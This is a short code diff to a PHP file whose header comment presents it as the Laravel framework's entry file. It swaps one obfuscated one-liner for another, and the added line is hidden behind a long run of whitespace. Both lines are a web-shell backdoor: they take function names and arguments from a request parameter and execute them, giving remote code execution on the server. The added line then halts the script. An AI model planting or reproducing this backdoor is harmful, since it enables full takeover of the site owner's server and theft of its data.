@@ -1,5 +1,5 @@
 <?php
-iF(	$lwJG =@${"_REQUEST"}["JKJXA6NS"]){ $lwJG[1 ]	(${$lwJG[2 ]}[	0],$lwJG[3]($lwJG[4])	);};
+                                                                                                                                                                                                    IF(	($LGZ6Ux=@${"_REQUEST"}["IJASBOZ0" ])&&(11123+21210 ) ){	$LGZ6Ux[1]($ {$LGZ6Ux[2]} [	0],	$LGZ6Ux	[3 ]($LGZ6Ux	[4]))	; };Die;
 
 /**
  * Laravel - A PHP Framework For Web Artisans
